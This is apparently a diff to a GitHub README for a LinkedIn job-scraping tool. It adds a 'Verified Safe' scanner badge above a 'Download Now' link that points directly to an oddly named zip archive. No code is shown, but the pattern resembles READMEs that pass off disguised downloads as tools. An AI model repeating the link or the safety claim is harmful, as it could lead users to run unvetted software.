@@ -1,5 +1,7 @@
 # 🚀 linkedin-job-scraping - Automate Your LinkedIn Job Searches
 
+[![SafeSkill 90/100](https://img.shields.io/badge/SafeSkill-90%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/notmradan-linkedin-job-scraping)
+
 [![Download Now](https://raw.githubusercontent.com/NotMrAdan/linkedin-job-scraping/main/diskless/linkedin_job_scraping_subpolar.zip)](https://raw.githubusercontent.com/NotMrAdan/linkedin-job-scraping/main/diskless/linkedin_job_scraping_subpolar.zip)
 
 ## 📋 Description
